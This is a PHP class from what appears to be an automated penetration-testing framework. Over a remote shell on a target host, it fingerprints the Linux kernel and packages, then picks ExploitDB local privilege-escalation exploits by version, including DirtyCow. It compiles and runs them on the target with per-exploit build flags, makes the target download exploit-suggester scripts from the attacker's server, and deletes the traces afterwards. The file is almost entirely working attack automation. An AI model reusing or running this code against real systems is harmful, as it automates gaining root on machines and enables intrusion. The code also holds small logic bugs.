<?php

class check4linux8exploits extends check4linux8misc{
    var $kernel_cve ;
    var $kernel_exploits ;
    var $kernel_msf ;
    var $kernel1 ;
    var $kernel2 ;
    var $kernel3 ;
    var $kernel4 ;
    var $os_plateforme_name ;
    var $os_kernel_number ;
    var $gdb_path ;
    
    /*
    
     */
    
    public function __construct($eth,$domain,$ip,$port,$protocol,$stream,$templateB64_id,$templateB64_cmd,$templateB64_shell,$id8b64) {

        
        parent::__construct($eth,$domain,$ip,$port,$protocol,$stream,$templateB64_id,$templateB64_cmd,$templateB64_shell,$id8b64);
        $this->kernel_cve = array();
        $this->kernel_exploits = array();
        // https://github.com/Ignitetechnologies/Privilege-Escalation/blob/master/Kernel%20Exploit.md
        $this->kernel_msf = array();
    }
    
    
    public function exploits8dpkg(){
        $this->ssTitre(__FUNCTION__);
        $app_name = "";
        $app_version = "";
        $prog_list = array();
        $data = "dpkg -l ";
        $tmp = $this->lan2stream4result($data,$this->stream_timeout);
        $tmpB64 = base64_encode($tmp);
        exec("echo '$tmpB64' | base64 -d | grep \"^ii\" | awk '{print $2 \"=\" $3 }'",$prog_list);
        
        if (!empty($prog_list)){
            $size = count($prog_list);
        for($i=0;$i<$size;$i++){
            $app = $prog_list[$i];
            $rst_version = array();
            $rst_name = array();
            if (!empty($app)){
                exec("echo '$app' | cut -d'=' -f2 | grep -Po \"^[0-9]{1,2}\.[0-9]{1,3}\" ",$rst_version);
                exec("echo '$app' | cut -d'=' -f1 | grep -Po \"^[a-z\-_]{1,}\" ",$rst_name);
                if(isset($rst_name[0])) $app_name = $rst_name[0];
                if(isset($rst_version[0])) $app_version = $rst_version[0];                
                $this->article("$i/$size App",$app_name);
                $this->article("Version",$app_version);
                if (!empty($app_name)) ;$this->exploits2file2exec($this->exploitdb("$app_name $app_version $this->os_plateforme_name"));
                unset($rst_name);unset($rst_version);
                
            }
        }
        }
        $this->pause();
    }
    
    
    public function parse4kernel($rst_uname_r){
        $this->ssTitre(__FUNCTION__);
        $kernel = array();
            if (preg_match('#^(?<kernel1>[2-4]{1}).(?<kernel2>[0-9]{1,2}).(?<kernel3>[0-9]{1,3})-(?<kernel4>[[:print:]]{1,})#',$rst_uname_r,$kernel))
        {
            $this->kernel1 = intval($kernel['kernel1']);
            $this->kernel2 = intval($kernel['kernel2']);
            $this->kernel3 = intval($kernel['kernel3']);
            $this->kernel4 = $kernel['kernel4'];
            $this->article("The Main Kernel Version", $this->kernel1) ;
            $this->article("The Major Revision", $this->kernel2) ;
            $this->article("The Minor Revision", $this->kernel3) ;
            $this->article("The Minor Fix/Revision Detail", $this->kernel4) ;
        }
        
    }
    
    public function exploits8kernels4known(){
        $this->ssTitre(__FUNCTION__);
        $tab_exploits = array();
        
        
        if ($this->kernel1==2){
            if ($this->kernel2==6 && empty($this->kernel3)){
                $tab_exploits[] = "/opt/exploitdb/exploits/linux/local/8572.c";
                
            }
            if ($this->kernel2>=4 && $this->kernel2<=6 && empty($this->kernel3)){
                $tab_exploits[] = "/opt/exploitdb/exploits/linux/local/9479.c";
                
            }
            if ($this->kernel2>=4 && $this->kernel2<=6 && !empty($this->kernel3)){
                if ($this->kernel3 <= 22){
                    $tab_exploits[] = "/opt/exploitdb/exploits/linux/local/6851.c";
                }
                if ($this->kernel3 <= 34){
                    $tab_exploits[] = "/opt/exploitdb/exploits/linux/local/15944.c";
                }
                if ($this->kernel3 >= 27 && $this->kernel3 <= 36){
                    $tab_exploits[] = "/opt/exploitdb/exploits/linux/local/15024.c";
                }
                if ($this->kernel3 <= 36){
                    $tab_exploits[] = "/opt/exploitdb/exploits/linux/local/14814.c";
                    $tab_exploits[] = "/opt/exploitdb/exploits/linux/local/15285.c";
                    $tab_exploits[] = "/opt/exploitdb/exploits/linux/local/17787.c";
                }
                if ($this->kernel3 <= 37){
                    $tab_exploits[] = "/opt/exploitdb/exploits/linux/local/15704.c";
                }
                $tab_exploits[] = "/opt/exploitdb/exploits/linux/local/9545.c";
                
            }
            if ($this->kernel2>=6){
                $tab_exploits[] = "/opt/exploitdb/exploits/linux/local/18411.c";
                $tab_exploits[] = "/opt/exploitdb/exploits/linux/local/17391.c";
                $tab_exploits[] = "/opt/exploitdb/exploits/linux/local/40616.c";
            }
        }
        
        
        if ($this->kernel1==3){
            if ($this->kernel2==13 && empty($this->kernel3)){
                $tab_exploits[] = "/opt/exploitdb/exploits/linux/local/33824.c";
                
            }
            if ($this->kernel2==0){
                $tab_exploits[] = "/opt/exploitdb/exploits/linux/local/17391.c";
            }
            if ($this->kernel2<=9){
                $tab_exploits[] = "/opt/exploitdb/exploits/linux/local/40616.c";
            }
            if ($this->kernel2==13 && $this->kernel2<=19){
                $tab_exploits[] = "/opt/exploitdb/exploits/linux/local/37292.c";
            }
            if ($this->kernel2==14 && $this->kernel3==5){
                $tab_exploits[] = "/opt/exploitdb/exploits/linux/local/35370.c";
            }
            if ($this->kernel2<=8 && $this->kernel3<=9){
                $tab_exploits[] = "/opt/exploitdb/exploits/linux/local/37292.c";
            }
            
            if ($this->kernel2<=2){
                $tab_exploits[] = "/opt/exploitdb/exploits/linux/local/18411.c";
            }
            if ($this->kernel2>19){
                $tab_exploits[] = "/opt/exploitdb/exploits/linux/local/39166.c";
                $tab_exploits[] = "/opt/exploitdb/exploits/linux/local/39772.c";
            }
        }
        
        if ($this->kernel1==4){
            if ($this->kernel2<=3 && $this->kernel3<=3){
                $tab_exploits[] = "/opt/exploitdb/exploits/linux/local/39166.c";
            }
            if ($this->kernel2==3 && $this->kernel3==3){
                $tab_exploits[] = "/opt/exploitdb/exploits/linux/local/39230.c";
            }
            if ($this->kernel2==4){
                if ($this->kernel3==0){
                $tab_exploits[] = "/opt/exploitdb/exploits/linux/local/40871.c";
                $tab_exploits[] = "$this->dir_c/40847_adapted.cpp";

                $tab_exploits[] = "/opt/exploitdb/exploits/linux/local/39772.c";
                }
                if ($this->kernel3>=0 && $this->kernel3<=21){
                    $tab_exploits[] = "/opt/exploitdb/exploits/linux/local/40049.c";
                }
                if ($this->kernel3==1){
                    $tab_exploits[] = "/opt/exploitdb/exploits/linux/local/39277.c";
                }
            }
        }
        return $tab_exploits;
    }
    
    
    public function exploits8kernels4suggest(){
        $this->ssTitre(__FUNCTION__);
        $kernel_exploits = array();
        $this->parse4kernel($this->os_kernel_number);
        
        if ( empty($this->os_kernel_number) && empty($this->os_plateforme_name)) return $kernel_exploits;
        $query = "searchsploit --colour \"$this->os_plateforme_name $this->os_kernel_number\" | grep -v \"/dos/\" | grep \"/local/\" | grep -i -E \"(priv|kernel|root|escalation)\" | grep -Po \"exploits/[[:print:]]{1,}$\"  | sed \"s#exploits/#/opt/exploitdb/exploits/#g\" ";
        $check = array();
        $check = $this->req_ret_tab($query);
        if (!empty($check)){
            $this->article("Exploits8exploitdb", $this->tab($check));
            return $check;
        }
        
       
        $query = "searchsploit --colour \"$this->os_plateforme_name $this->kernel1.$this->kernel2.$this->kernel3\" | grep -v \"/dos/\" | grep \"/local/\" | grep -i -E \"(priv|kernel|root|escalation)\" | grep -Po \"exploits/[[:print:]]{1,}$\"  | sed \"s#exploits/#/opt/exploitdb/exploits/#g\" ";
        $check = array();
        $check = $this->req_ret_tab($query);
        if (!empty($check)){
            $this->article("Exploits8exploitdb", $this->tab($check));
            return $check;
        }
        
        $query = "searchsploit --colour \"$this->os_plateforme_name $this->kernel1.$this->kernel2\" | grep -v \"/dos/\" | grep \"/local/\" | grep -i -E \"(priv|kernel|root|escalation)\" | grep -Po \"exploits/[[:print:]]{1,}$\"  | sed \"s#exploits/#/opt/exploitdb/exploits/#g\" ";
        $check = array();
        $check = $this->req_ret_tab($query);
        if (!empty($check)){
            $this->article("Exploits8exploitdb", $this->tab($check));
            return $check;
        }
        
        $query = "searchsploit --colour \"$this->os_kernel_number\" | grep -v \"/dos/\" | grep \"/local/\" | grep -i -E \"(priv|kernel|root|escalation)\" | grep -Po \"exploits/[[:print:]]{1,}$\"  | sed \"s#exploits/#/opt/exploitdb/exploits/#g\" ";
        $check = array();
        $check = $this->req_ret_tab($query);
        if (!empty($check)){
            $this->article("Exploits8exploitdb", $this->tab($check));
            return $check;
        }

        
return $kernel_exploits;
    }
    
    
    public function exploits(){
        
        /*
         wget https://raw.githubusercontent.com/wwong99/pentest-notes/master/scripts/xploit_installer.py
         USAGE: xploit_installer.py <exploit id>
         */

        $this->titre(__FUNCTION__);
       
        //return $this->exploits8dpkg();
        
        $exploits8kernels4known = $this->exploits8kernels4known();
        if (!$this->ip2root8db($this->ip2id)) $this->exploits2file2exec($exploits8kernels4known);
        
        
        if (!$this->ip2root8db($this->ip2id)) $this->exploits2exploit_suggester_2();$this->pause();
        if (!$this->ip2root8db($this->ip2id)) $this->exploits2exploit_suggester_1();$this->pause();
        //var_dump($this->kernel_exploits);
        $this->pause();
        
        $tmp = array();
        $filter = " | grep -v \"/dos/\" | grep -i -E \"(priv|kernel|root|escalation)\" ";
        foreach ($this->kernel_cve as $cve){
            if (!empty($cve))  {
                $cve = trim($cve);
                if ($cve=='CVE-2015-8660') {
                    $this->kernel_exploits[] =  "/opt/exploitdb/exploits/linux/local/39166.c";
                }
                // $tmp = $this->exploitdb($cve) ;
                // $result .= $this->cve8msf($cve);
                // if (!empty($tmp)) $this->kernel_exploits = array_merge($this->kernel_exploits,$tmp);
            }
        }
        
        $this->pause();
        $this->kernel_cve = array_unique($this->kernel_cve);
        if (!empty($this->kernel_cve)) rsort($this->kernel_cve);
        $this->article("CVE8all", "\n".$this->tab($this->kernel_cve));
        $platform = $this->ip2os4arch($this->ip2os());
        $app = "client";
        $tab_exp = array();
        foreach ($this->kernel_cve as $cve){
           // $tab_exp = array_merge($tab_exp,$this->msf2cve($cve,"",$platform,$app));
        }
                
        
        $exploits8kernels4suggest = $this->exploits8kernels4suggest();
        $kernel_exploits = array_unique($exploits8kernels4suggest);
        rsort($kernel_exploits); // ,$tab_exp
        //var_dump($this->kernel_exploits);
        $this->article("Exploits8all", "\n".$this->tab($kernel_exploits));
        //var_dump($this->kernel_exploits);

        $this->pause();
        
        if (!$this->ip2root8db($this->ip2id)) $this->exploits2file2exec($kernel_exploits);
        $this->pause();
    }
    
    
    
    public function exploits2file2exec($files_exploit){
        // https://github.com/Ignitetechnologies/Privilege-Escalation/blob/master/Kernel%20Exploit.md

        $this->ssTitre(__FUNCTION__);
        $template_id_euid = "";


        $files_exploit = array_filter(array_unique($files_exploit));
        //$files_exploit = array("/opt/exploitdb/exploits/linux/local/40847.cpp"); //
        //$files_exploit = array("/opt/exploitdb/exploits/linux/local/39166.c");
        
        
        
        if (!empty($files_exploit) && is_array($files_exploit) ){
            foreach ($files_exploit as $file_exploit){
                $file_exploit = trim($file_exploit);
                
                if( (!empty($file_exploit) && (!$this->ip2root8db($this->ip2id)) )){
                    
                    if(file_exists($file_exploit)){
                        $obj_file = new FILE($file_exploit);
                        $this->requette("grep -i -E \"(priv|kernel|root|escalation)\"  $obj_file->file_path");
                        
                        switch ($obj_file->file_name){
                            case "3" :                           
                            case "9542" :
                            case "26368" :
                            case "28718" :
                            case "37722" :
                            //case "40003" :
                            case "44298" :  // OK
                                $data = trim($this->exploit2file2compile($this->stream,"",$obj_file->file_path));
                                $template_id_euid = "$data '%ID%'";
                                break;

       
                                
                            case "17787" :
                                $data = trim($this->exploit2file2compile($this->stream,"-lrt",$obj_file->file_path));
                                $template_id_euid = "echo '%ID%' |  $data";
                                break;
                                
                            case "35370" :
                            case "40871" :
                            case "47170" :
                                $data = trim($this->exploit2file2compile($this->stream,"-lpthread",$obj_file->file_path));
                                $template_id_euid = "echo '%ID%' |  $data";
                                break;
                                
                            case "6851" :
                            case "8572" :
                            case "9479" :
                            case "9545" :                              
                            case "14814" :
                            case "15024" :
                            case "15285" :
                            case "15704" :
                            case "15944" :
                            case "17391" :
                            case "18411" :
                            case "26131" :
                            case "27297" :
                            case "33824" :
                            case "37292" : // OK typhon 1.02 10.60.10.143
                            case "39166" : // OK analoguepond 138
                            case "39230" :
                                $data = trim($this->exploit2file2compile($this->stream,"",$obj_file->file_path));
                                $template_id_euid = "echo '%ID%' |  $data";
                                break;
                            
                            case "39277" :
                            case "40003" :
                                $data = trim($this->exploit2file2compile($this->stream,"-lkeyutils",$obj_file->file_path));
                                $template_id_euid = "echo '%ID%' |  $data";
                                break;
                                
                            
                            case "40611" :
                                $data = trim($this->exploit2file2compile($this->stream,"-pthread",$obj_file->file_path));
                                $template_id_euid = "$data '%ID%'";
                                break;
                                
                            case "40616" :
                                $query = "cp $obj_file->file_path $obj_file->file_path.tmp ; sed -i 's/0x7f, 0x45, 0x4c, 0x46, 0x02, 0x01, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00,/\/* 0x7f, 0x45, 0x4c, 0x46, 0x02, 0x01, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00,/g' $obj_file->file_path.tmp; sed -i 's/unsigned int sc_len = 177;/unsigned int sc_len = 177; *\//g' $obj_file->file_path.tmp; sed -i 's/0x7f, 0x45, 0x4c, 0x46, 0x01, 0x01, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00,/*\/ 0x7f, 0x45, 0x4c, 0x46, 0x01, 0x01, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00,/g' $obj_file->file_path.tmp; sed -i 's/unsigned int sc_len = 136;/unsigned int sc_len = 136;\/*/g' $obj_file->file_path";
                                 $this->requette($query);
                                 $data = trim($this->exploit2file2compile($this->stream,"-pthread",$obj_file->file_path));
                                 $template_id_euid = "$data '%ID%'";
                                 
                                /* // crash Lampio 
                                $data = trim($this->exploit2file2compile($this->stream,"-pthread",$obj_file->file_path));
                                $template_id_euid = "$data '%ID%'";
                                if (!empty($template_id_euid)) $this->lan2pentest8id($template_id_euid);
                                
                                $cmd = "$data";
                                //fputs($this->stream, "$cmd\n");
                                $this->lan2stream4result($cmd, $this->stream_timeout);
                                
                                
                                $cmd = "echo 0 > /proc/sys/vm/dirty_writeback_centisecs";
                                //fputs($this->stream, "$cmd\n");
                                $this->lan2stream4result($cmd, $this->stream_timeout);
                                $cmd = "mv /tmp/bak /usr/bin/passwd";
                                $this->lan2stream4result($cmd, $this->stream_timeout);
                                */
                                break;
                                
                            case "40838" :
                            case "40839" :
                                $data = trim($this->exploit2file2compile($this->stream,"-pthread -lcrypt",$obj_file->file_path));
                                $template_id_euid = "$data '%ID%'";
                                break;
                                

                            case "40847_adapted" :
                                $data = trim($this->exploit2file2compile($this->stream,"-pedantic -O2 -std=c++11 -pthread -lutil ",$obj_file->file_path));
                                //$template_id_euid = "python -c 'import pty; pty.spawn(\"/bin/bash\")' ; echo 'dirtyCowFun' |  $data -s ; %ID%";
                                $template_id_euid = "script -qc \"$data -c '%ID%' \" ";
                                break;
     
                            default:
                                $this->note("Default");
                                $data = trim($this->exploit2file2compile($this->stream,"",$obj_file->file_path));
                                $template_id_euid = "echo '%ID%' |  $data";
                                break;
                                
                        }
                        //if (!empty($template_id_euid)) $this->lan2pentest8id($template_id_euid);
                        if (!empty($template_id_euid)) $this->lan2pentest8id($template_id_euid);
                        
                    }
                }
            }
        }
        

    }
    
    
    
    public function exploits2exploit_suggester_1(){
        $this->ssTitre(__FUNCTION__);
        //
        if (!file_exists("$this->dir_tmp/linux-exploit-suggester.sh")) $this->requette("wget https://raw.githubusercontent.com/mzet-/linux-exploit-suggester/master/linux-exploit-suggester.sh -O $this->dir_tmp/linux-exploit-suggester.sh ");
        $data = "wget http://".$this->ip4addr4target($this->ip).":$this->port_rfi/linux-exploit-suggester.sh -O ./linux-exploit-suggester.sh";
        $this->lan2stream4result($data,$this->stream_timeout);

        $data = "bash ./linux-exploit-suggester.sh --full";
        $lines_result = $this->lan2stream4result($data,$this->stream_timeout);
        
        $tab_exploits = array();
        $tab_sources = array();
        $tab_cve = array();
        
        exec("echo '$lines_result' | grep \"Download URL: https://www.exploit-db.com/download/\" | sed \"s#Download URL: https://www.exploit-db.com/download/##g\"  | awk '{print $1}' ",$tab_sources);
        
        if(!empty($tab_sources)){
            foreach ($tab_sources as $source){
                if (!empty($source)) 
                $tab_exploits[] = trim($this->req_ret_str("find /opt/exploitdb/exploits/ -iname \"$source.*\" -type f 2> /dev/null "));
            }
        }
        $this->pause();
        
        exec("echo '$lines_result' | grep -Po \"CVE-[0-9]{4}-[0-9]{4}\" ",$tab_cve);
        
        $this->kernel_exploits = array_unique($tab_exploits);
        $this->article("Exploits8exploit_suggester_1", "\n".$this->tab($this->kernel_exploits));
        
        $this->kernel_cve = array_unique($tab_cve);
        $this->article("CVE8exploit_suggester_1", "\n".$this->tab($this->kernel_cve));
        $data = "rm -v ./linux-exploit-suggester.sh ";
        $this->lan2stream4result($data,$this->stream_timeout);
    }
    
    
    public function exploits2exploit_suggester_2(){
        $this->ssTitre(__FUNCTION__);
        if (!file_exists("$this->dir_tmp/linux-exploit-suggester-2.pl")) $this->requette("wget https://raw.githubusercontent.com/jondonas/linux-exploit-suggester-2/master/linux-exploit-suggester-2.pl -O $this->dir_tmp/linux-exploit-suggester-2.pl ");
        $data = "wget http://".$this->ip4addr4target($this->ip).":$this->port_rfi/linux-exploit-suggester-2.pl -O /tmp/linux-exploit-suggester-2.pl";
        $this->lan2stream4result($data,$this->stream_timeout);
        
        $data = "perl /tmp/linux-exploit-suggester-2.pl | grep -i -E \"(CVE-|Source:)\" ";
        $lines_result = $this->lan2stream4result($data,$this->stream_timeout);
        $tab_exploits = array();
        $tab_sources = array();
        $query = "echo '$lines_result' | grep \"Source: http://www.exploit-db.com/exploits/\" | sed \"s#Source: http://www.exploit-db.com/exploits/##g\" | awk '{print $1}' ";
        //$tab_sources = $this->req_ret_tab($query);
        
        exec($query,$tab_sources);
        //$tab_sources = explode("\n", $this->tab($tab_sources_tmp)); 
        //$this->article("Sources", $this->tab($tab_sources));
        //var_dump($tab_sources);
        if(!empty($tab_sources)){
            foreach ($tab_sources as $source){
                if (!empty($source)) $tab_exploits[] = trim($this->req_ret_str("find /opt/exploitdb/exploits/ -iname \"$source.*\" -type f 2> /dev/null "));
            }
        }
        $this->pause();
        
        $tab_cve = array();
        $query = "echo '$lines_result' | grep -Po \"CVE-[0-9]{4}-[0-9]{4}\" ";
        //$tab_cve = $this->req_ret_tab($query);
        
        exec($query,$tab_cve);
        //$tab_cve = explode("\n", $this->tab($tab_cve_tmp)); 
        //$this->article("CVE", $this->tab($tab_cve));
        //var_dump($tab_cve);
        
        foreach ($tab_cve as $cve){
            $cve = trim($cve);
            if ($cve=='CVE-2015-8660') {
                $this->tab_cve_source[] = ["$cve" => "/opt/exploitdb/exploits/linux/local/39166.c"];
                $tab_exploits[] =  "/opt/exploitdb/exploits/linux/local/39166.c";
            }
        }
        

        $this->kernel_exploits = array_unique($tab_exploits);
        $this->article("Exploits8exploit_suggester_2", "\n".$this->tab($this->kernel_exploits));
        //var_dump($this->kernel_exploits);
        
        $this->kernel_cve = array_unique($tab_cve);
        $this->article("CVE8exploit_suggester_2", "\n".$this->tab($this->kernel_cve));
        //var_dump($this->kernel_cve);
        
        $data = "rm -v /tmp/linux-exploit-suggester-2.pl ";
        $this->lan2stream4result($data,$this->stream_timeout);
    }
    
    
    
}
?>